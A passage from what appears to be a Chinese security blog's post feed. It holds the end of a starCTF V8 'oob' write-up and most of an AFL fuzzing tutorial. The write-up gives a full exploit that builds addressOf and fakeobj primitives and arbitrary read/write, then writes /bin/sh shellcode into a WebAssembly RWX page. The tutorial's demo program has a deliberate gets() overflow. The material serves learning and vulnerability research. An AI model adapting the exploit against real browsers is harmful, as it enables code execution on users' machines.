0x3e43f7c49aa9&gt;</span></span><br><span class="line"><span class="comment"> - imported_function_refs: 0x1de519340c71 &lt;FixedArray[0]&gt;</span></span><br><span class="line"><span class="comment"> - managed_native_allocations: 0x2aeb9878e5c1 &lt;Foreign&gt;</span></span><br><span class="line"><span class="comment"> - memory_start: 0x7f85c0d80000</span></span><br><span class="line"><span class="comment"> - memory_size: 65536</span></span><br><span class="line"><span class="comment"> - memory_mask: ffff</span></span><br><span class="line"><span class="comment"> - imported_function_targets: 0x561c5e8f7100</span></span><br><span class="line"><span class="comment"> - globals_start: (nil)</span></span><br><span class="line"><span class="comment"> - imported_mutable_globals: 0x561c5e8f8480</span></span><br><span class="line"><span class="comment"> - indirect_function_table_size: 0</span></span><br><span class="line"><span class="comment"> - indirect_function_table_sig_ids: (nil)</span></span><br><span class="line"><span class="comment"> - indirect_function_table_targets: (nil)</span></span><br><span class="line"><span class="comment"> - properties: 0x1de519340c71 &lt;FixedArray[0]&gt; &#123;&#125;</span></span><br><span class="line"><span class="comment">pwndbg&gt; telescope 0x059fa561f8c1-1+0x88</span></span><br><span class="line"><span class="comment">00:0000│   0x59fa561f948 —▸ 0x1541e9fb6000 ◂— movabs r10, 0x1541e9fb6260 </span></span><br><span class="line"><span class="comment">01:0008│   0x59fa561f950 —▸ 0x2aeb9878e411 ◂— 0x7100003e43f7c491</span></span><br><span class="line"><span class="comment">02:0010│   0x59fa561f958 —▸ 0x2aeb9878e681 ◂— 0x7100003e43f7c4ad</span></span><br><span class="line"><span class="comment">03:0018│   0x59fa561f960 —▸ 0x59fa5601869 ◂— 0x1de519340f</span></span><br><span class="line"><span class="comment">04:0020│   0x59fa561f968 —▸ 0x59fa561f9e9 ◂— 0x7100003e43f7c4a1</span></span><br><span class="line"><span class="comment">05:0028│   0x59fa561f970 —▸ 0x1de5193404d1 ◂— 0x1de5193405</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">pwndbg&gt; vmmap 0x1541e9fb6000 #wasm code addr</span></span><br><span class="line"><span class="comment">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span></span><br><span class="line"><span class="comment">    0x1541e9fb6000     0x1541e9fb7000 rwxp     1000 0       +0x0</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> objArray = [obj];</span><br><span class="line"><span class="keyword">var</span> floatArray = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> objArrayMap = objArray.oob();</span><br><span class="line"><span class="keyword">var</span> floatArrayMap = floatArray.oob();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buf =<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> BigUint64Array(buf);</span><br><span class="line"><span class="comment">// 浮点数转换为64位无符号整数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">f</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为浮点数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为16进制字节串</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> i.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// leak the addrsess of obj</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">obj_to_leak</span>)</span>&#123;</span><br><span class="line">    objArray[<span class="number">0</span>] = obj_to_leak;</span><br><span class="line">    objArray.oob(floatArrayMap); <span class="comment">// type(obj)--&gt;type(float)</span></span><br><span class="line">    <span class="keyword">let</span> addr = f2i(objArray[<span class="number">0</span>])<span class="number">-1n</span>;</span><br><span class="line">    objArray.oob(objArrayMap);</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeobj</span>(<span class="params">addr_to_fake</span>)</span>&#123;</span><br><span class="line">    floatArray[<span class="number">0</span>] = i2f(addr_to_fake+<span class="number">1n</span>);</span><br><span class="line">    floatArray.oob(objArrayMap);  <span class="comment">// type(float)--&gt;type(obj)</span></span><br><span class="line">    <span class="keyword">let</span> fake_obj = floatArray[<span class="number">0</span>];</span><br><span class="line">    floatArray.oob(floatArrayMap);</span><br><span class="line">    <span class="keyword">return</span> fake_obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_array = [</span><br><span class="line">    floatArrayMap,</span><br><span class="line">    i2f(<span class="number">0n</span>),</span><br><span class="line">    i2f(<span class="number">0x41414141n</span>),<span class="comment">// fake obj&#x27;s elements ptr</span></span><br><span class="line">    i2f(<span class="number">0x1000000000n</span>),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">    <span class="number">2.2</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_array_addr = addressOf(fake_array);</span><br><span class="line"><span class="keyword">var</span> fake_object_addr = fake_array_addr - <span class="number">0x30n</span></span><br><span class="line"><span class="keyword">var</span> fake_object = fakeobj(fake_object_addr);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    <span class="keyword">let</span> leak_data = f2i(fake_object[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] leak from: 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(leak_data));</span><br><span class="line">    <span class="keyword">return</span> leak_data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write64</span>(<span class="params">addr, data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_object[<span class="number">0</span>] = i2f(data);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] write to : 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(data));    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> data_buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(data_buf);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = addressOf(data_buf) + <span class="number">0x20n</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">writeDataview</span>(<span class="params">addr,data</span>)</span>&#123;</span><br><span class="line">    write64(buf_backing_store_addr, addr);</span><br><span class="line">    data_view.setBigUint64(<span class="number">0</span>, data, <span class="literal">true</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] write to : 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(data));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get shell</span></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.exports.main;</span><br><span class="line"><span class="keyword">var</span> f_addr = addressOf(f);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] leak wasm func addr: 0x&quot;</span> + hex(f_addr));</span><br><span class="line"><span class="keyword">var</span> shared_info_addr = read64(f_addr + <span class="number">0x18n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> wasm_exported_func_data_addr = read64(shared_info_addr + <span class="number">0x8n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> wasm_instance_addr = read64(wasm_exported_func_data_addr + <span class="number">0x10n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> rwx_page_addr = read64(wasm_instance_addr + <span class="number">0x88n</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] leak rwx_page_addr: 0x&quot;</span> + hex(rwx_page_addr));</span><br><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">    <span class="number">0x2fbb485299583b6an</span>,</span><br><span class="line">    <span class="number">0x5368732f6e69622fn</span>,</span><br><span class="line">    <span class="number">0x050f5e5457525f54n</span></span><br><span class="line">];</span><br><span class="line"><span class="keyword">var</span> data_buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">24</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(data_buf);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = addressOf(data_buf) + <span class="number">0x20n</span>;</span><br><span class="line">write64(buf_backing_store_addr, rwx_page_addr);</span><br><span class="line">data_view.setFloat64(<span class="number">0</span>, i2f(shellcode[<span class="number">0</span>]), <span class="literal">true</span>);</span><br><span class="line">data_view.setFloat64(<span class="number">8</span>, i2f(shellcode[<span class="number">1</span>]), <span class="literal">true</span>);</span><br><span class="line">data_view.setFloat64(<span class="number">16</span>, i2f(shellcode[<span class="number">2</span>]), <span class="literal">true</span>);</span><br><span class="line">f();</span><br></pre></td></tr></table></figure><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>复现了蛮久的，细节还需要多理解。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://juejin.im/post/6844904096260947981#heading-2">https://juejin.im/post/6844904096260947981#heading-2</a></p><p><a href="https://changochen.github.io/2019-04-29-starctf-2019.html">https://changochen.github.io/2019-04-29-starctf-2019.html</a></p><p><a href="https://www.freebuf.com/vuls/203721.html">https://www.freebuf.com/vuls/203721.html</a></p><p><a href="https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/">https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/</a></p><p><a href="https://e3pem.github.io/2019/07/31/browser/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%85%A5%E9%97%A8%E4%B9%8Bstarctf-OOB/">https://e3pem.github.io/2019/07/31/browser/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%85%A5%E9%97%A8%E4%B9%8Bstarctf-OOB/</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Chromium </category>
          
      </categories>
      
      
        <tags>
            
            <tag> V8 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fuzz&quot;入门&quot;</title>
      <link href="posts/2ba75ee3/"/>
      <url>posts/2ba75ee3/</url>
      
        <content type="html"><![CDATA[<h1 id="Fuzz-简介"><a href="#Fuzz-简介" class="headerlink" title="Fuzz 简介"></a>Fuzz 简介</h1><p><strong>模糊测试</strong> （fuzz testing, fuzzing）是一种<a href="https://zh.wikipedia.org/wiki/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95">软件测试</a>技术。其核心思想是将自动或半自动生成的随机数据输入到一个<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A8%8B%E5%BA%8F">程序</a>中，并监视程序异常，如崩溃，<a href="https://zh.wikipedia.org/wiki/%E6%96%B7%E8%A8%80_(%E7%A8%8B%E5%BC%8F)">断言</a>（assertion）失败，以发现可能的程序错误，比如内存泄漏。模糊测试常常用于检测软件或计算机系统的安全漏洞。</p><h2 id="Fuzz-的发展历程"><a href="#Fuzz-的发展历程" class="headerlink" title="Fuzz 的发展历程"></a>Fuzz 的发展历程</h2><ol><li><p>文件Fuzzing技术</p></li><li><p>语法模板Fuzzing</p></li><li><p>符号执行</p><p> 符号执行在学术界中应用得比较多，工业界相对少一些。在Fuzzing中，通过约束求解新路径的条件值，以增加代码覆盖率，可以一定程度上弥补暴力变异的不足。符号执行主要的挑战在于路径爆炸问题，约束求解能力的局限性，以及性能消耗问题，比如内存和时间消耗过大。</p></li><li><p>代码覆盖引导技术</p><p> 目前业界中基于代码覆盖率的最著名的三大Fuzzer，Google开发的<code>AFL</code>、<code>libfuzzer</code>和<code>honggfuzz</code>，且他们都是开源的，在github上都可以搜索到。</p></li></ol><h2 id="Pros-amp-Cons"><a href="#Pros-amp-Cons" class="headerlink" title="Pros &amp; Cons"></a>Pros &amp; Cons</h2><p>Fuzzing 是对于寻找漏洞是非常有效的，但其不是万能的，以下是它的一些优缺点。</p><p><strong>Pros</strong></p><ul><li>（不需要持续交互）Provides results with little effort - once a fuzzer’s up and running, it can be left for hours, days, or months to look for bugs with no interaction</li><li>Can reveal bugs missed in a manual audit</li><li>（检测程序整体的稳定性）Provides an overall picture of the robustness of the target software</li></ul><p><strong>Cons</strong></p><ul><li>（不能找到所有的漏洞）Won’t find all bugs - fuzzing may miss bugs that don’t trigger a full program crash, and may be less likely to trigger bugs that are only triggered in highly specific circumstances</li><li>（crash 样本比较难分析）The crashing test cases that are produced may be difficult to analyze, as the act of fuzzing doesn’t give you much knowledge of how the software operates internally</li><li>（对于复杂的程序效率会比较低）Programs with complex inputs can require much more work to produce a smart enough fuzzer to get sufficient code coverage</li></ul><h2 id="Anatomy-of-a-fuzzer"><a href="#Anatomy-of-a-fuzzer" class="headerlink" title="Anatomy of a fuzzer"></a>Anatomy of a fuzzer</h2><p>为了有效fuzz，fuzzer需要执行以下任务</p><ul><li>生成测试样本</li><li>记录测试用例的信息</li><li>把测试样例作为输入文件和目标程序（loader）进行对接</li><li>检测并监控 <code>crash</code></li></ul><p>其实上述所说的也就是一个 fuzzer 完整跑一遍的流程的简化。</p><h2 id="What-should-I-fuzz-Finding-the-right-software"><a href="#What-should-I-fuzz-Finding-the-right-software" class="headerlink" title="What should I fuzz? Finding the right software"></a>What should I fuzz? Finding the right software</h2><p>AFL在C或C ++应用程序上效果最好，因此，在 fuzz 之前一个”有效”的软件的攻击面是更为重要的。</p><ol><li>软件是否有示例代码？<ul><li>我们要 fuzz 的软件可能是很复杂很庞大的，如果其拥有大量的实例代码，那么我们快速定位到特定的模块，对每个模块单独 fuzz，这样测试的效果会更加优越。</li></ul></li><li>是否开源？<ul><li>对比开源项目来讲 afl 的效率会高很多，虽然 afl 也支持使用 qemu 进行黑盒 fuzz，但是效率会大打折扣。</li></ul></li><li>特殊样本是否容易收集？<ul><li>我们可能会要 fuzz 不同的文件格式，如果能够快速收集到大量有效的特殊的样本，那么 fuzz 的效率也会随之提高。</li></ul></li></ol><h1 id="AFL简介"><a href="#AFL简介" class="headerlink" title="AFL简介"></a>AFL简介</h1><p>AFL（American Fuzzy Lop）是由安全研究员Micha? Zalewski（<a href="https://twitter.com/lcamtuf">@lcamtuf</a>）开发的一款基于覆盖引导（Coverage-guided）的模糊测试工具，它通过记录输入样本的代码覆盖率，从而调整输入样本以提高覆盖率，增加发现漏洞的概率。</p><h2 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h2><ul><li>从源码编译程序时进行插桩，以记录代码覆盖率（Code Coverage）</li><li>选择一些输入文件，作为初始测试集加入输入队列（queue）</li><li>将队列中的文件按一定的策略进行”突变”</li><li>如果经过变异文件更新了覆盖范围，则将其保留添加到队列中</li><li>上述过程会一直循环进行，期间触发了crash的文件会被记录下来</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20200803080223.jpeg" alt="afl"></p><blockquote><p>程序插桩:<br>最早是由J.C. Huang 教授提出的，它是在保证被测程序原有逻辑完整性的基础上在程序中插入一些<a href="https://baike.baidu.com/item/%E6%8E%A2%E9%92%88/1846154">探针</a>（又称为“探测仪”，本质上就是进行信息采集的<a href="https://baike.baidu.com/item/%E4%BB%A3%E7%A0%81%E6%AE%B5/9966451">代码段</a>，可以是<a href="https://baike.baidu.com/item/%E8%B5%8B%E5%80%BC%E8%AF%AD%E5%8F%A5/4248688">赋值语句</a>或采集覆盖信息的<a href="https://baike.baidu.com/item/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/4127405">函数调用</a>），通过<a href="https://baike.baidu.com/item/%E6%8E%A2%E9%92%88/1846154">探针</a>的执行并抛出程序运行的<a href="https://baike.baidu.com/item/%E7%89%B9%E5%BE%81/6205236">特征</a>数据，通过对这些数据的<a href="https://baike.baidu.com/item/%E5%88%86%E6%9E%90/4327108">分析</a>，可以获得程序的<a href="https://baike.baidu.com/item/%E6%8E%A7%E5%88%B6%E6%B5%81/854473">控制流</a>和数据流信息，进而得到<a href="https://baike.baidu.com/item/%E9%80%BB%E8%BE%91%E8%A6%86%E7%9B%96/3231015">逻辑覆盖</a>等动态信息，从而实现测试目的的方法。</p><p>代码覆盖率：<br>软件测试中的一种度量，描述程式中源代码被测试的比例和程度，所得比例称为代码覆盖率。</p></blockquote><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><ul><li>直接安装：<code>sudo apt install afl</code></li><li><a href="http://lcamtuf.coredump.cx/afl/">官网</a>下载压缩包，解压后在目录中打开终端输入：<code>sudo make;sudo make install</code></li></ul><blockquote><p>推荐自己编译安装，apt 安装不支持黑盒测试。</p></blockquote><h2 id="Fuzz目标"><a href="#Fuzz目标" class="headerlink" title="Fuzz目标"></a>Fuzz目标</h2><p><code>AFL</code>主要用于<code>C/C++</code>程序的测试，所以这是我们寻找软件的最优先规则。</p><p>目标开源与否不是很重要。</p><ul><li><p>对于开源软件：AFL软件进行编译的同时进行插桩，以方便fuzz（效率更高</p></li><li><p>对于闭源软件：配合QEMU直接对闭源的二进制代码进行fuzz</p></li></ul><h2 id="构建语料库"><a href="#构建语料库" class="headerlink" title="构建语料库"></a>构建语料库</h2><p>AFL需要一些初始输入数据（也叫种子文件）作为Fuzzing的起点，这些输入甚至可以是毫无意义的数据，AFL可以通过启发式算法自动确定文件格式结构。</p><p>尽管AFL如此强大，但如果要获得更快的Fuzzing速度，那么就有必要生成一个高质量的语料库（”有用的”输入的集合）</p><h3 id="语料库选择"><a href="#语料库选择" class="headerlink" title="语料库选择"></a>语料库选择</h3><ul><li>有效的输入：尽管有时候无效输入会产生bug和崩溃，但有效输入可以更快的找到更多执行路径。</li><li>尽量小的体积：种子文件最好小于 1KB，较小的文件会不仅可以减少测试和处理的时间，也能节约更多的内存。</li></ul><h3 id="主要来源"><a href="#主要来源" class="headerlink" title="主要来源"></a>主要来源</h3><ol><li><p>使用项目自身提供的测试用例</p></li><li><p>目标程序bug提交页面</p></li><li><p>使用格式转换器，用从现有的文件格式生成一些不容易找到的文件格式：</p></li><li><p>afl源码的testcases目录下提供了一些测试用例</p></li><li><p>其他大型的语料库</p><ul><li><p><a href="http://lcamtuf.coredump.cx/afl/demo/">afl generated image test sets</a></p></li><li><p><a href="https://github.com/google/fuzzer-test-suite">fuzzer-test-suite</a></p></li><li><p><a href="https://samples.libav.org/">libav samples</a></p></li><li><p><a href="http://samples.ffmpeg.org/">ffmpeg samples</a></p></li><li><p><a href="https://github.com/MozillaSecurity/fuzzdata">fuzzdata</a></p></li><li><p><a href="https://gitlab.anu.edu.au/lunar/moonshine">moonshine</a></p></li></ul></li></ol><h3 id="修剪"><a href="#修剪" class="headerlink" title="修剪"></a>修剪</h3><p>网上找到的一些大型语料库中往往包含大量的文件，这时就需要对其精简，这个工作有个术语叫做——语料库蒸馏（Corpus Distillation）。AFL提供了两个工具来帮助我们完成这部工作——<code>afl-cmin</code>和<code>afl-tmin</code>。</p><h4 id="AFL-CMIN"><a href="#AFL-CMIN" class="headerlink" title="AFL-CMIN"></a>AFL-CMIN</h4><p><code>afl-cmin</code>的核心思想是：<strong>尝试找到与语料库全集具有相同覆盖范围的最小子集</strong>。举个例子：假设有多个文件，都覆盖了相同的代码，那么就丢掉多余的文件。其使用方法如下：</p><p><code>$ afl-cmin -i input_dir -o output_dir -- /path/to/tested/program [params]</code></p><p>更多的时候，我们需要从文件中获取输入，这时可以使用<code>@@</code>代替被测试程序命令行中输入文件名的位置。Fuzzer会将其替换为实际执行的文件：</p><p><code>$ afl-cmin -i input_dir -o output_dir -- /path/to/tested/program [params] @@</code></p><h4 id="AFL-TMIN"><a href="#AFL-TMIN" class="headerlink" title="AFL-TMIN"></a>AFL-TMIN</h4><p><code>afl-tmin</code>用来缩减文件体积。</p><p><code>afl-tmin</code>有两种工作模式，<code>instrumented mode</code>和<code>crash mode</code>。默认的工作方式是<code>instrumented mode</code>。</p><p>命令： <code>$ afl-tmin -i input_file -o output_file -- /path/to/tested/program [params] @@</code> </p><p>如果指定了参数<code>-x</code>，即<code>crash mode</code>，会把导致程序非正常退出的文件直接剔除。</p><p>命令：<code>$ afl-tmin -x -i input_file -o output_file -- /path/to/tested/program [params] @@</code></p><h1 id="AFL实例"><a href="#AFL实例" class="headerlink" title="AFL实例"></a>AFL实例</h1><h2 id="开始Fuzz"><a href="#开始Fuzz" class="headerlink" title="开始Fuzz"></a>开始Fuzz</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">(<span class="keyword">char</span> *str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">&#x27;A&#x27;</span> &amp;&amp; len == <span class="number">66</span>) &#123;</span><br><span class="line">        raise(SIGSEGV); <span class="comment">//如果输入的字符串的首字符为A并且长度为66，则异常退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">&#x27;F&#x27;</span> &amp;&amp; len == <span class="number">6</span>) &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//如果输入的字符串的首字符为F并且长度为6，则异常退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;it is good!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    </span><br><span class="line">    gets(buf);<span class="comment">//存在栈溢出漏洞</span></span><br><span class="line">   